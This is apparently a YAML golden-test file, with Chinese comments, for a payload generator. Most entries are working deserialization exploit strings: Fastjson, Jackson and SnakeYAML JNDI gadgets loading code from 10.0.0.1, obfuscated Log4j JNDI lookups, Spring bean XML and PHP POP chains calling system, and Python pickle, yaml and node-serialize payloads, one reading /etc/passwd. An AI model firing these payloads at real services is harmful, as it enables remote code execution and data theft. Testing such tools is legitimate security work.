# 扩充批次的黄金样本：反序列化（Java/PHP/Python/Node）+ 结构化数据类
# （NoSQL / LDAP / XPath / 原型链 / JWT / 文件上传）。
#
# 期望值全部按 body 手推：槽位代入 → 变量替换 → 无绕过 → raw 输出。
# 几条 PHP 载荷里的 \0 是 PHP 对 private/protected 属性的**真实字节**编码
# （`\0类名\0属性` / `\0*\0属性`），所以期望值必须写成 YAML 双引号标量——
# 单引号不处理转义，写出来的是「反斜杠 + 0」两个字节，长度对不上。
#
# `syntax` 断言的取值说明：
#   ok        —— 该内容类型有可靠 parser 且过了（JSON / XML / PHP 序列化）
#   unchecked —— 本工具没能力判：yaml / raw / xpath / ldap-filter / file-path /
#                shell-command 没有 parser；PHP 序列化串里出现 r:/R: 引用时
#                校验器明确说自己没建模（**不是**校验失败）
# 这两者的区别是刻意的，run_golden 也分开断言。

ruleDB: v0.1.0

samples:
  # ================= Java · Fastjson =================

  - name: Fastjson L 前缀绕过黑名单
    state:
      vuln: deser
      template: deser.java.fastjson.jdbcrowset.bypass
      vars: {lhost: "10.0.0.1", lport: "1389", name: "exp"}
      outputs: [raw]
    expect:
      payload: "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://10.0.0.1:1389/exp\",\"autoCommit\":true}"
      syntax: ok

  - name: Fastjson TemplatesImpl 字节码
    state:
      vuln: deser
      template: deser.java.fastjson.templatesimpl
      vars: {b64: "yv66vgAA"}
      outputs: [raw]
    expect:
      payload: "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAA\"],\"_name\":\"a\",\"_tfactory\":{},\"_outputProperties\":{}}"
      syntax: ok

  - name: Fastjson 出网探测（DNS）
    state:
      vuln: deser
      template: deser.java.fastjson.dns
      vars: {domain: "abc.dnslog.cn"}
      outputs: [raw]
    expect:
      payload: "{\"@type\":\"java.net.Inet4Address\",\"val\":\"abc.dnslog.cn\"}"
      syntax: ok

  # ================= Java · Jackson =================

  - name: Jackson TemplatesImpl
    state:
      vuln: deser
      template: deser.java.jackson.templatesimpl
      vars: {b64: "yv66vgAA"}
      outputs: [raw]
    expect:
      payload: "[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"_bytecodes\":[\"yv66vgAA\"],\"_name\":\"a\",\"_tfactory\":{},\"_outputProperties\":{}}]"
      syntax: ok

  - name: Jackson 加载远程 Spring 上下文
    state:
      vuln: deser
      template: deser.java.jackson.springboot
      vars: {lhost: "10.0.0.1"}
      outputs: [raw]
    expect:
      payload: "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://10.0.0.1/bean.xml\"]"
      syntax: ok

  # ================= Java · SnakeYAML =================

  - name: SnakeYAML JdbcRowSetImpl
    state:
      vuln: deser
      template: deser.java.snakeyaml.jdbcrowset
      vars: {lhost: "10.0.0.1", lport: "1389", name: "exp"}
      outputs: [raw]
    expect:
      # 块标量 |− 不带末尾换行；缩进是 YAML 的一部分，原样保留
      payload: |-
        !!com.sun.rowset.JdbcRowSetImpl
          dataSourceName: "ldap://10.0.0.1:1389/exp"
          autoCommit: true
      syntax: unchecked

  - name: SnakeYAML 加载远程 Spring 上下文
    state:
      vuln: deser
      template: deser.java.snakeyaml.spring
      vars: {lhost: "10.0.0.1"}
      outputs: [raw]
    expect:
      payload: '!!org.springframework.context.support.ClassPathXmlApplicationContext ["http://10.0.0.1/bean.xml"]'
      syntax: unchecked

  # ================= Java · Log4j =================

  - name: Log4j env 取默认值
    state:
      vuln: deser
      template: deser.java.log4j.obfuscate.env
      vars: {lhost: "10.0.0.1", lport: "1389", name: "exp"}
      outputs: [raw]
    expect:
      # 槽位默认 env-default：${env:X:-j} 在 X 不存在时求值为 j
      payload: "${${env:X:-j}ndi:${env:X:-l}dap}://10.0.0.1:1389/exp"
      syntax: unchecked

  - name: Log4j sys 取默认值（非默认槽位取值）
    state:
      vuln: deser
      template: deser.java.log4j.obfuscate.env
      slots: {style: sys-default}
      vars: {lhost: "10.0.0.1", lport: "1389", name: "exp"}
      outputs: [raw]
    expect:
      payload: "${${sys:x:-j}ndi:${sys:x:-l}dap}://10.0.0.1:1389/exp"
      syntax: unchecked

  - name: Log4j upper 套 lower
    state:
      vuln: deser
      template: deser.java.log4j.obfuscate.env
      slots: {style: upper-nested}
      vars: {lhost: "10.0.0.1", lport: "1389", name: "exp"}
      outputs: [raw]
    expect:
      # 内层 ${lower:j}ndi 先变成 jndi，外层 upper 再把它变成 JNDI；
      # 展开后就是 JNDI:LDAP://…，过滤器看到的却是两层 ${}
      payload: "${upper:${lower:j}ndi}:${upper:${lower:l}dap}://10.0.0.1:1389/exp"
      syntax: unchecked

  # ================= Java · Spring / XMLDecoder =================

  - name: Spring bean XML（Linux）
    state:
      vuln: deser
      template: deser.java.spring.beanxml
      vars: {cmd: id}
      outputs: [raw]
    expect:
      payload: |-
        <?xml version="1.0" encoding="UTF-8"?>
        <beans xmlns="http://www.springframework.org/schema/beans"
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
          <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
              <list>
                <value>/bin/sh</value>
                <value>-c</value>
                <value>id</value>
              </list>
            </constructor-arg>
          </bean>
        </beans>
      syntax: ok

  - name: Spring bean XML（Windows 解释器）
    state:
      vuln: deser
      template: deser.java.spring.beanxml
      slots: {sh: cmd}
      vars: {cmd: whoami}
      outputs: [raw]
    expect:
      payload: |-
        <?xml version="1.0" encoding="UTF-8"?>
        <beans xmlns="http://www.springframework.org/schema/beans"
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
          <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
              <list>
                <value>cmd.exe</value>
                <value>/c</value>
                <value>whoami</value>
              </list>
            </constructor-arg>
          </bean>
        </beans>
      syntax: ok

  - name: XMLDecoder 出网探测
    state:
      vuln: deser
      template: deser.java.xmldecoder.ssrf
      vars: {lhost: "10.0.0.1"}
      outputs: [raw]
    expect:
      payload: |-
        <java version="1.8.0" class="java.beans.XMLDecoder">
         <object class="java.net.URL">
          <string>http://10.0.0.1/</string>
          <void method="openStream"/>
         </object>
        </java>
      syntax: ok

  # ================= PHP · 公开 POP 链 =================
  # 这几条的期望值里 \0 是真实字节：PHP 用 `\0类名\0属性` 编码 private、
  # `\0*\0属性` 编码 protected。所以只能用 YAML 双引号标量写。

  - name: Monolog RCE1（SyslogUdpHandler）
    state:
      vuln: deser
      template: deser.php.pop.monolog.rce1
      vars: {cmd: id}
      outputs: [raw]
    expect:
      # 7 个属性：handler(r:2 自引用) / bufferSize / buffer / level /
      # initialized / bufferLimit / processors=['current','system']
      payload: "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\0*\0socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\0*\0handler\";r:2;s:13:\"\0*\0bufferSize\";i:-1;s:9:\"\0*\0buffer\";a:1:{i:0;a:2:{i:0;s:2:\"id\";s:5:\"level\";N;}}s:8:\"\0*\0level\";N;s:14:\"\0*\0initialized\";b:1;s:14:\"\0*\0bufferLimit\";i:-1;s:13:\"\0*\0processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}"
      # BufferHandler 的 handler 属性 r:2 指回自己（上一层那个对象）。
      # 引用现在**有校验器了**——校验器独立实现了 PHP 那份编号规则并核对了指向
      syntax: ok

  - name: Guzzle FileCookieJar 写文件（FW1）
    state:
      vuln: deser
      template: deser.php.pop.guzzle.fw1
      vars: {file: "a.php", cmd: "id"}
      outputs: [raw]
    expect:
      # FileCookieJar 4 个属性：自己的 filename / storeSessionCookies，
      # 父类 CookieJar 的 cookies / strictMode——后两个的 mangled 名里是 CookieJar
      payload: "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":4:{s:41:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0filename\";s:5:\"a.php\";s:52:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0storeSessionCookies\";b:1;s:36:\"\0GuzzleHttp\\Cookie\\CookieJar\0cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"\0GuzzleHttp\\Cookie\\SetCookie\0data\";a:3:{s:7:\"Expires\";i:1;s:7:\"Discard\";b:0;s:5:\"Value\";s:2:\"id\";}}}s:39:\"\0GuzzleHttp\\Cookie\\CookieJar\0strictMode\";N;}"
      syntax: ok

  - name: Guzzle FW1 · 换落点路径
    state:
      vuln: deser
      template: deser.php.pop.guzzle.fw1
      vars: {file: "/tmp/x.php", cmd: "id"}
      outputs: [raw]
    expect:
      # 只有 filename 的长度前缀变了：/tmp/x.php 是 10 字节
      payload: "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":4:{s:41:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0filename\";s:10:\"/tmp/x.php\";s:52:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0storeSessionCookies\";b:1;s:36:\"\0GuzzleHttp\\Cookie\\CookieJar\0cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"\0GuzzleHttp\\Cookie\\SetCookie\0data\";a:3:{s:7:\"Expires\";i:1;s:7:\"Discard\";b:0;s:5:\"Value\";s:2:\"id\";}}}s:39:\"\0GuzzleHttp\\Cookie\\CookieJar\0strictMode\";N;}"
      syntax: ok

  - name: Laravel PendingBroadcast · Dispatcher
    state:
      vuln: deser
      template: deser.php.pop.laravel.pendingbroadcast
      vars: {cmd: "id"}
      outputs: [raw]
    expect:
      payload: "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\0*\0events\";O:28:\"Illuminate\\Events\\Dispatcher\":1:{s:12:\"\0*\0listeners\";a:1:{s:2:\"id\";a:1:{i:0;s:6:\"system\";}}}s:8:\"\0*\0event\";s:2:\"id\";}"
      syntax: ok

  - name: Laravel PendingBroadcast · Faker（非默认槽位取值）
    state:
      vuln: deser
      template: deser.php.pop.laravel.pendingbroadcast
      slots: {chain: faker}
      vars: {cmd: "id"}
      outputs: [raw]
    expect:
      payload: "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\0*\0events\";O:15:\"Faker\\Generator\":1:{s:13:\"\0*\0formatters\";a:1:{s:8:\"dispatch\";s:6:\"system\";}}s:8:\"\0*\0event\";s:2:\"id\";}"
      syntax: ok

  - name: ThinkPHP 5.1 反序列化链
    state:
      vuln: deser
      template: deser.php.pop.thinkphp.windows
      vars: {key: "ethan"}
      outputs: [raw]
    expect:
      # private 属性 data 的 mangled 名是 \0think\Model\0data —— 它来自 Model use 的
      # trait，用的是「使用 trait 的那个类」；r:9 是出处里原样的自引用编号
      payload: "O:27:\"think\\process\\pipes\\Windows\":1:{s:34:\"\0think\\process\\pipes\\Windows\0files\";a:1:{i:0;O:17:\"think\\model\\Pivot\":2:{s:9:\"\0*\0append\";a:1:{s:5:\"ethan\";a:2:{i:0;s:3:\"dir\";i:1;s:4:\"calc\";}}s:17:\"\0think\\Model\0data\";a:1:{s:5:\"ethan\";O:13:\"think\\Request\":3:{s:7:\"\0*\0hook\";a:1:{s:7:\"visible\";a:2:{i:0;r:9;i:1;s:6:\"isAjax\";}}s:9:\"\0*\0filter\";s:6:\"system\";s:9:\"\0*\0config\";a:1:{s:8:\"var_ajax\";s:0:\"\";}}}}}}"
      syntax: ok

  - name: ThinkPHP 5.1 · 换键名
    state:
      vuln: deser
      template: deser.php.pop.thinkphp.windows
      vars: {key: "Ki1ro"}
      outputs: [raw]
    expect:
      # 键名出现两处（append 与 data 的键），两处的长度前缀都是 5
      payload: "O:27:\"think\\process\\pipes\\Windows\":1:{s:34:\"\0think\\process\\pipes\\Windows\0files\";a:1:{i:0;O:17:\"think\\model\\Pivot\":2:{s:9:\"\0*\0append\";a:1:{s:5:\"Ki1ro\";a:2:{i:0;s:3:\"dir\";i:1;s:4:\"calc\";}}s:17:\"\0think\\Model\0data\";a:1:{s:5:\"Ki1ro\";O:13:\"think\\Request\":3:{s:7:\"\0*\0hook\";a:1:{s:7:\"visible\";a:2:{i:0;r:9;i:1;s:6:\"isAjax\";}}s:9:\"\0*\0filter\";s:6:\"system\";s:9:\"\0*\0config\";a:1:{s:8:\"var_ajax\";s:0:\"\";}}}}}}"
      syntax: ok

  - name: Yii2 BatchQueryResult 链
    state:
      vuln: deser
      template: deser.php.pop.yii2.batchquery
      vars: {cmd: "id"}
      outputs: [raw]
    expect:
      # Connection 的 pdo/dsn、ColumnSchemaBuilder 的 categoryMap 是 public（裸名），
      # _dataReader/_cache 是 private（mangled 名带着各自的类），type 是 protected
      payload: "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"\0yii\\db\\BatchQueryResult\0_dataReader\";O:17:\"yii\\db\\Connection\":2:{s:3:\"pdo\";i:1;s:3:\"dsn\";O:26:\"yii\\db\\ColumnSchemaBuilder\":2:{s:7:\"\0*\0type\";s:1:\"x\";s:11:\"categoryMap\";O:22:\"yii\\caching\\ArrayCache\":2:{s:10:\"serializer\";a:1:{i:1;s:6:\"system\";}s:30:\"\0yii\\caching\\ArrayCache\0_cache\";a:1:{s:1:\"x\";a:2:{i:0;s:2:\"id\";i:1;i:0;}}}}}}"
      syntax: ok

  # ================= PHP · 外层包装（两段式）=================

  - name: PHP 外层包装 · 数组键（带嵌套内层载荷）
    state:
      vuln: deser
      template: deser.php.wrap.array
      vars: {key: "user"}
      nest: 'O:4:"User":1:{s:4:"name";s:5:"admin";}'
      outputs: [raw]
    expect:
      # <<payload>> 在「嵌套」这一步被换成 nest（跑在变量替换之后）
      payload: 'a:1:{s:4:"user";O:4:"User":1:{s:4:"name";s:5:"admin";}}'
      syntax: ok

  - name: PHP 外层包装 · 数组键（没给嵌套载荷，占位符原样保留）
    state:
      vuln: deser
      template: deser.php.wrap.array
      vars: {key: "user"}
      outputs: [raw]
    expect:
      # 契约 3：没填就原样留着，产出明显不可用的串（不猜、不吐半截）
      payload: 'a:1:{s:4:"user";<<payload>>}'

  - name: PHP 外层包装 · 对象属性（带嵌套内层载荷）
    state:
      vuln: deser
      template: deser.php.wrap.object
      vars: {cls: "App\\Cache", prop: "socket"}
      nest: 'O:10:"SoapClient":1:{s:3:"uri";s:8:"http://x";}'
      outputs: [raw]
    expect:
      # 类名 App\Cache 是 9 字节、属性名 socket 是 6 字节
      payload: "O:9:\"App\\Cache\":1:{s:6:\"socket\";O:10:\"SoapClient\":1:{s:3:\"uri\";s:8:\"http://x\";}}"
      syntax: ok

  # ================= Python =================

  - name: pickle 协议 0 · V 操作码
    state:
      vuln: deser
      template: deser.python.pickle.proto0.unicode
      vars: {cmd: "id"}
      outputs: [raw]
    expect:
      # V 读到行尾为止，所以载荷里一个引号都没有
      payload: |-
        cos
        system
        (Vid
        tR.

  - name: pickle 协议 0 · os.popen
    state:
      vuln: deser
      template: deser.python.pickle.proto0.popen
      vars: {cmd: "id"}
      outputs: [raw]
    expect:
      payload: |-
        cos
        popen
        (Vid
        tR.

  - name: pickle 协议 0 · Python 2 模块名
    state:
      vuln: deser
      template: deser.python.pickle.proto0.py2
      vars: {cmd: "id"}
      outputs: [raw]
    expect:
      payload: |-
        c__builtin__
        eval
        (S'__import__("os").popen("id").read()'
        tR.

  - name: yaml.load · subprocess 走向
    state:
      vuln: deser
      template: deser.python.yaml.unsafe_load.subprocess
      vars: {cmd: "id"}
      outputs: [raw]
    expect:
      # <<shell>> 是内置变量，默认 bash
      payload: '!!python/object/apply:subprocess.check_output [["bash", "-c", "id"]]'
      syntax: unchecked

  - name: yaml.load · subprocess（带参数的命令）
    state:
      vuln: deser
      template: deser.python.yaml.unsafe_load.subprocess
      vars: {cmd: "cat /etc/passwd"}
      outputs: [raw]
    expect:
      payload: '!!python/object/apply:subprocess.check_output [["bash", "-c", "cat /etc/passwd"]]'
      syntax: unchecked

  # ================= Node =================

  - name: node-serialize 裸表达式
    state:
      vuln: deser
      template: deser.node.serialize.expr
      vars: {cmd: "id"}
      outputs: [raw]
    expect:
      payload: "{\"rce\":\"_$$ND_FUNC$$_process.mainModule.require('child_process').execSync('id').toString()\"}"
      syntax: ok

  - name: node-serialize 载荷嵌在子对象里
    state:
      vuln: deser
      template: deser.node.serialize.nested
      vars: {cmd: "id"}
      outputs: [raw]
    expect:
      payload: "{\"data\":{\"data\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()\"}}"
